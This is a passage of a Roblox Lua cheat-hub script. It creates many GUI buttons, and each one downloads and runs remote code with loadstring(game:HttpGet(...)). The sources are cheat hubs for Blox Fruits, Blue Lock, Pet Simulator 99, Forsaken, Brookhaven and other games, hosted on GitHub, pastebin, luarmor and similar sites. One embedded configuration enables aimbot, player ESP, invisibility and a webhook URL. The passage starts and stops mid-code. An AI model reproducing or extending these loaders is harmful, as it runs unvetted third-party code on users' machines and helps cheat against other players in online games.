loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
end)

local scg19 = Instance.new("TextButton")
scg19.Parent = sc
scg19.Name = "scg19"
scg19.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg19.Position = UDim2.new(0.00996587239, 0, 0.750, 0)
scg19.BackgroundColor3 = Color3.new(0, 0, 0)
scg19.BorderColor3 = Color3.new(1, 0, 0)
scg19.BorderSizePixel = 3
scg19.TextColor3 = Color3.new(1, 1, 1)
scg19.TextScaled = true
scg19.Font = Enum.Font.Roboto
scg19.Text = "Neva hub (Bloxfruit)"
scg19.Visible = false
scg19.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/XFTUAe56"))();
end)

local scg20 = Instance.new("TextButton")
scg20.Parent = sc
scg20.Name = "scg20"
scg20.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg20.Position = UDim2.new(0.18, 0, 0.750, 0)
scg20.BackgroundColor3 = Color3.new(0, 0, 0)
scg20.BorderColor3 = Color3.new(1, 0, 0)
scg20.BorderSizePixel = 3
scg20.TextColor3 = Color3.new(1, 1, 1)
scg20.TextScaled = true
scg20.Font = Enum.Font.Roboto
scg20.Text = "Bounty Hunter (Bloxfruit) "
scg20.Visible = false
scg20.MouseButton1Click:Connect(function()
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
getgenv().Team = "Pirates"
getgenv().Config = {
    ["Safe Health"] = {50},
    ["Custom Y Run"] = {
        Enabled = true,
        ["Y Run"] = 5000
    },
    ["Hunt Method"] = {
        ["Use Move Predict"] = false,
        ["Hit and Run"] = false,
        ["Aimbot"] = true,
        ["ESP Player"] = true,
        ["Max Attack Time"] = 60
    },
    ["Shop"] = {
        ["Random Fruit"] = false,
        ["Store Fruit"] = true,
        ["Zoro Sword"] = false
    },
    ["Ui Theme"] = {
        ["Background"] = "139756291389843",
        ["Skip Button"] = "113079599736013",
        ["Reset Bounty Button"] = "118191900561814"
    },
    ["Setting"] = {
        ["World"] = nil,
        ["White Screen"] = false,
        ["Invisible"] = true,
        ["Fast Delay"] = 0.5,
        ["Tween Speed"] = 350,
        ["Set Player Server Hop"] = 1,
        ["Url"] = "Your_Webhook_Url",
        ["Chat"] = {
            Enabled = false,
            Wait = 350,
            Massage = {""}
        }
    },
    ["Skip"] = {
        ["Avoid V4"] = false
    },
    ["Spam All Skill On V4"] = {
        Enabled = true,
        ["Weapons"] = {"Melee", "Sword", "Gun", "Blox Fruit"}
    },
    Items = {
        Use = {"Melee", "Sword"},
        Melee = {
            Enable = true,
            Delay = 0.4,
            Skills = {
                Z = {Enable = true, HoldTime = 0.3},
                X = {Enable = true, HoldTime = 0.2},
                C = {Enable = true, HoldTime = 0.5}
            }
        },
        Sword = {
            Enable = true,
            Delay = 0.5,
            Skills = {
                Z = {Enable = true, HoldTime = 1},
                X = {Enable = true, HoldTime = 0}
            }
        },
        Gun = {
            Enable = false,
            Delay = 0.2,
            Skills = {
                Z = {Enable = false, HoldTime = 0.1},
                X = {Enable = false, HoldTime = 0.1}
            }
        },
        ["Blox Fruit"] = {
            Enable = false,
            Delay = 0.4,
            Skills = {
                Z = {Enable = true, HoldTime = 0.1},
                X = {Enable = true, HoldTime = 0.1},
                C = {Enable = true, HoldTime = 0.15},
                V = {Enable = false, HoldTime = 0.2},
                F = {Enable = true, HoldTime = 0.1}
            }
        }
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/10f7f97cebba24a87808c36ebd345a97.lua"))()
end)

local scg21 = Instance.new("TextButton")
scg21.Parent = sc
scg21.Name = "scg21"
scg21.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg21.Position = UDim2.new(0.35, 0, 0.750, 0)
scg21.BackgroundColor3 = Color3.new(0, 0, 0)
scg21.BorderColor3 = Color3.new(1, 0, 0)
scg21.BorderSizePixel = 3
scg21.TextColor3 = Color3.new(1, 1, 1)
scg21.TextScaled = true
scg21.Font = Enum.Font.Roboto
scg21.Text = "Banana Hub (Bloxfruit)"
scg21.Visible = false
scg21.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kimprobloxdz/Banana-Free/refs/heads/main/Protected_5609200582002947.lua.txt"))()
end)

local scg22 = Instance.new("TextButton")
scg22.Parent = sc
scg22.Name = "scg22"
scg22.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg22.Position = UDim2.new(0.52, 0, 0.750, 0)
scg22.BackgroundColor3 = Color3.new(0, 0, 0)
scg22.BorderColor3 = Color3.new(1, 0, 0)
scg22.BorderSizePixel = 3
scg22.TextColor3 = Color3.new(1, 1, 1)
scg22.TextScaled = true
scg22.Font = Enum.Font.Roboto
scg22.Text = "Redz Hub {BloxFruit}"
scg22.Visible = false
scg22.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/ACOX6D6h/raw"))()
end)

local scg23 = Instance.new("TextButton")
scg23.Parent = sc
scg23.Name = "scg23"
scg23.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg23.Position = UDim2.new(0.69, 0, 0.750, 0)
scg23.BackgroundColor3 = Color3.new(0, 0, 0)
scg23.BorderColor3 = Color3.new(1, 1, 0)
scg23.BorderSizePixel = 3
scg23.TextColor3 = Color3.new(1, 1, 1)
scg23.TextScaled = true
scg23.Font = Enum.Font.Roboto
scg23.Text = "HoHo Hub {BloxFruit}"
scg23.Visible = false
scg23.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
end)

local scg24 = Instance.new("TextButton")
scg24.Parent = sc
scg24.Name = "scg24"
scg24.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scg24.Position = UDim2.new(0.86, 0, 0.750, 0)
scg24.BackgroundColor3 = Color3.new(0, 0, 0)
scg24.BorderColor3 = Color3.new(1, 0, 0)
scg24.BorderSizePixel = 3
scg24.TextColor3 = Color3.new(1, 1, 1)
scg24.TextScaled = true
scg24.Font = Enum.Font.Roboto
scg24.Text = "Speed Hub X (BloxFruit)"
scg24.Visible = false
scg24.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

local scgn25 = Instance.new("TextButton")
scgn25.Parent = sc
scgn25.Name = "scgn25"
scgn25.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn25.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
scgn25.BackgroundColor3 = Color3.new(0, 0, 0)
scgn25.BorderColor3 = Color3.new(1, 0, 0)
scgn25.BorderSizePixel = 3
scgn25.TextColor3 = Color3.new(1, 1, 1)
scgn25.TextScaled = true
scgn25.Font = Enum.Font.Roboto
scgn25.Text = "ToraIsMe (Arise Crossover)"
scgn25.Visible = false
scgn25.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/AriseCrossover"))()
end)

local scgn26 = Instance.new("TextButton")
scgn26.Parent = sc
scgn26.Name = "scgn26"
scgn26.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn26.Position = UDim2.new(0.18, 0, 0.03, 0)
scgn26.BackgroundColor3 = Color3.new(0, 0, 0)
scgn26.BorderColor3 = Color3.new(1, 0, 0)
scgn26.BorderSizePixel = 3
scgn26.TextColor3 = Color3.new(1, 1, 1)
scgn26.TextScaled = true
scgn26.Font = Enum.Font.Roboto
scgn26.Text = "Speed Hub X {AriseCrossover}"
scgn26.Visible = false
scgn26.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

local scgn27 = Instance.new("TextButton")
scgn27.Parent = sc
scgn27.Name = "scgn27"
scgn27.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn27.Position = UDim2.new(0.35, 0, 0.03, 0)
scgn27.BackgroundColor3 = Color3.new(0, 0, 0)
scgn27.BorderColor3 = Color3.new(1, 1, 0)
scgn27.BorderSizePixel = 3
scgn27.TextColor3 = Color3.new(1, 1, 1)
scgn27.TextScaled = true
scgn27.Font = Enum.Font.Roboto
scgn27.Text = "devry Hub (Arise Crossover) "
scgn27.Visible = false
scgn27.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/defnotry/devry-hub/main/arise-crossover/main.lua"))()
end)

local scgn28 = Instance.new("TextButton")
scgn28.Parent = sc
scgn28.Name = "scgn28"
scgn28.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn28.Position = UDim2.new(0.52, 0, 0.03, 0)
scgn28.BackgroundColor3 = Color3.new(0, 0, 0)
scgn28.BorderColor3 = Color3.new(1, 0, 0)
scgn28.BorderSizePixel = 3
scgn28.TextColor3 = Color3.new(1, 1, 1)
scgn28.TextScaled = true
scgn28.Font = Enum.Font.Roboto
scgn28.Text = "Frost Hub (AriseCrossover)"
scgn28.Visible = false
scgn28.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Scripts/refs/heads/main/AriseCrossover/Script.luau"))()
end)

local scgn29 = Instance.new("TextButton")
scgn29.Parent = sc
scgn29.Name = "scgn29"
scgn29.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn29.Position = UDim2.new(0.69, 0, 0.03, 0)
scgn29.BackgroundColor3 = Color3.new(0, 0, 0)
scgn29.BorderColor3 = Color3.new(1, 0, 0)
scgn29.BorderSizePixel = 3
scgn29.TextColor3 = Color3.new(1, 1, 1)
scgn29.TextScaled = true
scgn29.Font = Enum.Font.Roboto
scgn29.Text = "Frusteddy (AriseCrossover)"
scgn29.Visible = false
scgn29.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Scripts/refs/heads/main/AriseCrossover"))()
end)

local scgn30 = Instance.new("TextButton")
scgn30.Parent = sc
scgn30.Name = "scgn30"
scgn30.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgn30.Position = UDim2.new(0.86, 0, 0.03, 0)
scgn30.BackgroundColor3 = Color3.new(0, 0, 0)
scgn30.BorderColor3 = Color3.new(1, 1, 0)
scgn30.BorderSizePixel = 3
scgn30.TextColor3 = Color3.new(1, 1, 1)
scgn30.TextScaled = true
scgn30.Font = Enum.Font.Roboto
scgn30.Text = "NS Hub (AriseCrossover) "
scgn30.Visible = false
scgn30.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/y/refs/heads/main/hj"))()
end)

local scgn31 = Instance.new("TextButton")
scgn31.Parent = sc
scgn31.Name = "scgn31"
scgn31.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn31.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
scgn31.BackgroundColor3 = Color3.new(0, 0, 0)
scgn31.BorderColor3 = Color3.new(1, 1, 0)
scgn31.BorderSizePixel = 3
scgn31.TextColor3 = Color3.new(1, 1, 1)
scgn31.TextScaled = true
scgn31.Font = Enum.Font.SourceSans
scgn31.Text = "XzuyaX Hub (Bluelock)"
scgn31.Visible = false
scgn31.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/XZuuyaX/XZuyaX-s-Hub/refs/heads/main/Main.Lua", true))()
end)

local scgn32 = Instance.new("TextButton")
scgn32.Parent = sc
scgn32.Name = "scgn32"
scgn32.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn32.Position = UDim2.new(0.18, 0, 0.229999959, 0)
scgn32.BackgroundColor3 = Color3.new(0, 0, 0)
scgn32.BorderColor3 = Color3.new(1, 0, 0)
scgn32.BorderSizePixel = 3
scgn32.TextColor3 = Color3.new(1, 1, 1)
scgn32.TextScaled = true
scgn32.Font = Enum.Font.SourceSans
scgn32.Text = "Tbao Hub (Bluelock)"
scgn32.Visible = false
scgn32.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/refs/heads/main/TbaoHubBlueLockRivals"))()
end)

local scgn33 = Instance.new("TextButton")
scgn33.Parent = sc
scgn33.Name = "scgn33"
scgn33.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn33.Position = UDim2.new(0.35, 0, 0.229999959, 0)
scgn33.BackgroundColor3 = Color3.new(0, 0, 0)
scgn33.BorderColor3 = Color3.new(1, 1, 0)
scgn33.BorderSizePixel = 3
scgn33.TextColor3 = Color3.new(1, 1, 1)
scgn33.TextScaled = true
scgn33.Font = Enum.Font.Roboto
scgn33.Text = "Control Ball (Bluelock)"
scgn33.Visible = false
scgn33.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RedJDark/CONTROL-SCRIPTT/refs/heads/main/CONTROL"))()
end)

local scgn34 = Instance.new("TextButton")
scgn34.Parent = sc
scgn34.Name = "scgn34"
scgn34.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn34.Position = UDim2.new(0.52, 0, 0.229999959, 0)
scgn34.BackgroundColor3 = Color3.new(0, 0, 0)
scgn34.BorderColor3 = Color3.new(1, 1, 0)
scgn34.BorderSizePixel = 3
scgn34.TextColor3 = Color3.new(1, 1, 1)
scgn34.TextScaled = true
scgn34.Font = Enum.Font.Roboto
scgn34.Text = "Alchemy Hub (Bluelock)"
scgn34.Visible = false
scgn34.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
end)

local scgn35 = Instance.new("TextButton")
scgn35.Parent = sc
scgn35.Name = "scgn35"
scgn35.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn35.Position = UDim2.new(0.69, 0, 0.229999959, 0)
scgn35.BackgroundColor3 = Color3.new(0, 0, 0)
scgn35.BorderColor3 = Color3.new(1, 1, 0)
scgn35.BorderSizePixel = 3
scgn35.TextColor3 = Color3.new(1, 1, 1)
scgn35.TextScaled = true
scgn35.Font = Enum.Font.Roboto
scgn35.Text = "OMG Hub (Bluelock)"
scgn35.Visible = false
scgn35.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Blue-Lock:-Rivals-OMG-Hub-29091"))()
end)

local scgn36 = Instance.new("TextButton")
scgn36.Parent = sc
scgn36.Name = "scgn36"
scgn36.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgn36.Position = UDim2.new(0.86, 0, 0.229999959, 0)
scgn36.BackgroundColor3 = Color3.new(0, 0, 0)
scgn36.BorderColor3 = Color3.new(1, 0, 0)
scgn36.BorderSizePixel = 3
scgn36.TextColor3 = Color3.new(1, 1, 1)
scgn36.TextScaled = true
scgn36.Font = Enum.Font.Roboto
scgn36.Text = "Dehism (Bluelock)"
scgn36.Visible = false
scgn36.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dehism/Dehism/refs/heads/main/Inf%20Spins%20Auto%20Dehism",true))()
end)

local scgn37 = Instance.new("TextButton")
scgn37.Parent = sc
scgn37.Name = "scgn37"
scgn37.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn37.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
scgn37.BackgroundColor3 = Color3.new(0, 0, 0)
scgn37.BorderColor3 = Color3.new(1, 0, 0)
scgn37.BorderSizePixel = 3
scgn37.TextColor3 = Color3.new(1, 1, 1)
scgn37.TextScaled = true
scgn37.Font = Enum.Font.Roboto
scgn37.Text = "Noro ded Gui (Tsb)"
scgn37.Visible = false
scgn37.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/Noro-ded/add5f50deb5351b84a58f9e26784d421/raw/f4fe60235768436d96a1bd61802ae79eebcab3ce/mainguitsb", true))()
end)

local scgn38 = Instance.new("TextButton")
scgn38.Parent = sc
scgn38.Name = "scgn38"
scgn38.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn38.Position = UDim2.new(0.18, 0, 0.43, 0)
scgn38.BackgroundColor3 = Color3.new(0, 0, 0)
scgn38.BorderColor3 = Color3.new(1, 0, 0)
scgn38.BorderSizePixel = 3
scgn38.TextColor3 = Color3.new(1, 1, 1)
scgn38.TextScaled = true
scgn38.Font = Enum.Font.Roboto
scgn38.Text = "Speed Hub x (Tsb)"
scgn38.Visible = false
scgn38.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

local scgn39 = Instance.new("TextButton")
scgn39.Parent = sc
scgn39.Name = "scgn39"
scgn39.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn39.Position = UDim2.new(0.35, 0, 0.43, 0)
scgn39.BackgroundColor3 = Color3.new(0, 0, 0)
scgn39.BorderColor3 = Color3.new(1, 0, 0)
scgn39.BorderSizePixel = 3
scgn39.TextColor3 = Color3.new(1, 1, 1)
scgn39.TextScaled = true
scgn39.Font = Enum.Font.Roboto
scgn39.Text = "Animation Gui (Tsb)"
scgn39.Visible = false
scgn39.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Mautiku/ehh/main/strong%20guest.lua.txt'))()
end)

local scgn40 = Instance.new("TextButton")
scgn40.Parent = sc
scgn40.Name = "scgn40"
scgn40.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn40.Position = UDim2.new(0.52, 0, 0.43, 0)
scgn40.BackgroundColor3 = Color3.new(0, 0, 0)
scgn40.BorderColor3 = Color3.new(1, 1, 0)
scgn40.BorderSizePixel = 3
scgn40.TextColor3 = Color3.new(1, 1, 1)
scgn40.TextScaled = true
scgn40.Font = Enum.Font.Roboto
scgn40.Text = "Star Hub v4 (Tsb)"
scgn40.Visible = false
scgn40.MouseButton1Click:Connect(function()
--[[https://discord.gg/KcT5aNK24z (Join Discord for new versions and updates) ]]--

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bc25e1f8ef8aa59092de8f8f4c4fb95c.lua"))()
end)

local scgn41 = Instance.new("TextButton")
scgn41.Parent = sc
scgn41.Name = "scgn41"
scgn41.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn41.Position = UDim2.new(0.69, 0, 0.43, 0)
scgn41.BackgroundColor3 = Color3.new(0, 0, 0)
scgn41.BorderColor3 = Color3.new(1, 1, 0)
scgn41.BorderSizePixel = 3
scgn41.TextColor3 = Color3.new(1, 1, 1)
scgn41.TextScaled = true
scgn41.Font = Enum.Font.Roboto
scgn41.Text = "Lightux Hub (Tsb)"
scgn41.Visible = false
scgn41.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
end)

local scgn42 = Instance.new("TextButton")
scgn42.Parent = sc
scgn42.Name = "scgn42"
scgn42.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgn42.Position = UDim2.new(0.86, 0, 0.43, 0)
scgn42.BackgroundColor3 = Color3.new(0, 0, 0)
scgn42.BorderColor3 = Color3.new(1, 0, 0)
scgn42.BorderSizePixel = 3
scgn42.TextColor3 = Color3.new(1, 1, 1)
scgn42.TextScaled = true
scgn42.Font = Enum.Font.Roboto
scgn42.Text = "Spooks Hub (Tsb)"
scgn42.Visible = false
scgn42.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/spookshubTSB/refs/heads/main/SHTSB.txt'))()
end)

local scgn43 = Instance.new("TextButton")
scgn43.Parent = sc
scgn43.Name = "scgn43"
scgn43.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn43.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
scgn43.BackgroundColor3 = Color3.new(0, 0, 0)
scgn43.BorderColor3 = Color3.new(1, 0, 0)
scgn43.BorderSizePixel = 3
scgn43.TextColor3 = Color3.new(1, 1, 1)
scgn43.TextScaled = true
scgn43.Font = Enum.Font.Roboto
scgn43.Text = "6FootScripts (Pet Sim99)"
scgn43.Visible = false
scgn43.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SlamminPig/6FootScripts/main/Scripts/PetSimulator99.lua'))();
end)

local scgn44 = Instance.new("TextButton")
scgn44.Parent = sc
scgn44.Name = "scgn44"
scgn44.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn44.Position = UDim2.new(0.18, 0, 0.63, 0)
scgn44.BackgroundColor3 = Color3.new(0, 0, 0)
scgn44.BorderColor3 = Color3.new(1, 1, 0)
scgn44.BorderSizePixel = 3
scgn44.TextColor3 = Color3.new(1, 1, 1)
scgn44.TextScaled = true
scgn44.Font = Enum.Font.Roboto
scgn44.Text = "Verteniasty Hub (Pets Sim99)"
scgn44.Visible = false
scgn44.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring"))()
end)

local scgn45 = Instance.new("TextButton")
scgn45.Parent = sc
scgn45.Name = "scgn45"
scgn45.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn45.Position = UDim2.new(0.35, 0, 0.63, 0)
scgn45.BackgroundColor3 = Color3.new(0, 0, 0)
scgn45.BorderColor3 = Color3.new(1, 0, 0)
scgn45.BorderSizePixel = 3
scgn45.TextColor3 = Color3.new(1, 1, 1)
scgn45.TextScaled = true
scgn45.Font = Enum.Font.Roboto
scgn45.Text = "REE Hub (Pets Sim99)"
scgn45.Visible = false
scgn45.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeeScripts/FREEHub/main/Loader", true))()
end)

local scgn46 = Instance.new("TextButton")
scgn46.Parent = sc
scgn46.Name = "scgn46"
scgn46.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn46.Position = UDim2.new(0.52, 0, 0.63, 0)
scgn46.BackgroundColor3 = Color3.new(0, 0, 0)
scgn46.BorderColor3 = Color3.new(1, 0, 0)
scgn46.BorderSizePixel = 3
scgn46.TextColor3 = Color3.new(1, 1, 1)
scgn46.TextScaled = true
scgn46.Font = Enum.Font.Roboto
scgn46.Text = "Ganja Hub (Pets Sim99)"
scgn46.Visible = false
scgn46.MouseButton1Click:Connect(function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/Krnow1/Ganjahub/main/Ganjahubontop")()
end)

local scgn47 = Instance.new("TextButton")
scgn47.Parent = sc
scgn47.Name = "scgn47"
scgn47.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgn47.Position = UDim2.new(0.69, 0, 0.63, 0)
scgn47.BackgroundColor3 = Color3.new(0, 0, 0)
scgn47.BorderColor3 = Color3.new(1, 1, 0)
scgn47.BorderSizePixel = 3
scgn47.TextColor3 = Color3.new(1, 1, 1)
scgn47.TextScaled = true
scgn47.Font = Enum.Font.Roboto
scgn47.Text = "ZapHub (Pets Sim99)"
scgn47.Visible = false
scgn47.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
end)

local scgn48 = Instance.new("TextButton")
scgn48.Parent = sc
scgn48.Name = "scgn48"
scgn48.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgn48.Position = UDim2.new(0.86, 0, 0.63, 0)
scgn48.BackgroundColor3 = Color3.new(0, 0, 0)
scgn48.BorderColor3 = Color3.new(1, 0, 0)
scgn48.BorderSizePixel = 3
scgn48.TextColor3 = Color3.new(1, 1, 1)
scgn48.TextScaled = true
scgn48.Font = Enum.Font.Roboto
scgn48.Text = "Redz hub (Pets Sim99)"
scgn48.Visible = false
scgn48.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
end)

local scgn49 = Instance.new("TextButton")
scgn49.Parent = sc
scgn49.Name = "scgn49"
scgn49.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
scgn49.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
scgn49.BackgroundColor3 = Color3.new(0, 0, 0)
scgn49.BorderColor3 = Color3.new(1, 0, 0)
scgn49.BorderSizePixel = 2
scgn49.TextColor3 = Color3.new(1, 1, 1)
scgn49.TextScaled = true
scgn49.Font = Enum.Font.Roboto
scgn49.Text = "Saryn Hub\n(Forsaken)"
scgn49.Visible = false
scgn49.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Saiky988/Saryn-Hub/refs/heads/main/Saryn%Hub%Beta.lua'))()
end)

local scgn50 = Instance.new("TextButton")
scgn50.Parent = sc
scgn50.Name = "scgn50"
scgn50.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
scgn50.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
scgn50.BackgroundColor3 = Color3.new(0, 0, 0)
scgn50.BorderColor3 = Color3.new(1, 1, 0)
scgn50.BorderSizePixel = 2
scgn50.TextColor3 = Color3.new(1, 1, 1)
scgn50.TextScaled = true
scgn50.Font = Enum.Font.Roboto
scgn50.Text = "Fartsaken\n(Forsaken)"
scgn50.Visible = false
scgn50.MouseButton1Click:Connect(function()
if getgenv then
    getgenv().BloxtrapRPC = "true"
    getgenv().DebugNotifications = "false"
    getgenv().TrackMePlease = "true"
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/ivannetta/ShitScripts/main/forsaken.lua"))()
end)

scgne51 = Instance.new("TextButton")
scgne51.Parent = sc
scgne51.Name = "scgne51"
scgne51.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne51.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
scgne51.BackgroundColor3 = Color3.new(0, 0, 0)
scgne51.BorderColor3 = Color3.new(1, 0, 0)
scgne51.BorderSizePixel = 3
scgne51.TextColor3 = Color3.new(1, 1, 1)
scgne51.TextScaled = true
scgne51.Font = Enum.Font.Roboto
scgne51.Text = "SP Hub\n(Brookhaven)"
scgne51.Visible = false
scgne51.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
end)

scgne52 = Instance.new("TextButton")
scgne52.Parent = sc
scgne52.Name = "scgne52"
scgne52.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne52.Position = UDim2.new(0.18, 0, 0.03, 0)
scgne52.BackgroundColor3 = Color3.new(0, 0, 0)
scgne52.BorderColor3 = Color3.new(1, 0, 0)
scgne52.BorderSizePixel = 3
scgne52.TextColor3 = Color3.new(1, 1, 1)
scgne52.TextScaled = true
scgne52.Font = Enum.Font.Roboto
scgne52.Text = "Mango Hub\n(Brookhaven)"
scgne52.Visible = false
scgne52.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub", true))()
end)

scgne53 = Instance.new("TextButton")
scgne53.Parent = sc
scgne53.Name = "scgne53"
scgne53.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne53.Position = UDim2.new(0.35, 0, 0.03, 0)
scgne53.BackgroundColor3 = Color3.new(0, 0, 0)
scgne53.BorderColor3 = Color3.new(1, 0, 0)
scgne53.BorderSizePixel = 3
scgne53.TextColor3 = Color3.new(1, 1, 1)
scgne53.TextScaled = true
scgne53.Font = Enum.Font.Roboto
scgne53.Text = "Sander X\n(Brookhaven) "
scgne53.Visible = false
scgne53.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/NormalSS.lua'))()
end)

scgne54 = Instance.new("TextButton")
scgne54.Parent = sc
scgne54.Name = "scgne54"
scgne54.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne54.Position = UDim2.new(0.52, 0, 0.03, 0)
scgne54.BackgroundColor3 = Color3.new(0, 0, 0)
scgne54.BorderColor3 = Color3.new(1, 0, 0)
scgne54.BorderSizePixel = 3
scgne54.TextColor3 = Color3.new(1, 1, 1)
scgne54.TextScaled = true
scgne54.Font = Enum.Font.Roboto
scgne54.Text = "z4trox hub\n(Brookhaven)"
scgne54.Visible = false
scgne54.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Jfdedit3/z4trox-hub-v1/main/z4trox%20hub'))()
end)

scgne55 = Instance.new("TextButton")
scgne55.Parent = sc
scgne55.Name = "scgne55"
scgne55.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne55.Position = UDim2.new(0.69, 0, 0.03, 0)
scgne55.BackgroundColor3 = Color3.new(0, 0, 0)
scgne55.BorderColor3 = Color3.new(1, 0, 0)
scgne55.BorderSizePixel = 3
scgne55.TextColor3 = Color3.new(1, 1, 1)
scgne55.TextScaled = true
scgne55.Font = Enum.Font.Roboto
scgne55.Text = "AudioPlayer edit\n(Brookhaven)"
scgne55.Visible = false
scgne55.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nmalka01/nmalka01/refs/heads/main/Brookhaven_audio"))()
end)

scgne56 = Instance.new("TextButton")
scgne56.Parent = sc
scgne56.Name = "scgne56"
scgne56.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgne56.Position = UDim2.new(0.86, 0, 0.03, 0)
scgne56.BackgroundColor3 = Color3.new(0, 0, 0)
scgne56.BorderColor3 = Color3.new(1, 0, 0)
scgne56.BorderSizePixel = 3
scgne56.TextColor3 = Color3.new(1, 1, 1)
scgne56.TextScaled = true
scgne56.Font = Enum.Font.Roboto
scgne56.Text = "ameicaa1 audioPlayer\n(Brookhaven) "
scgne56.Visible = false
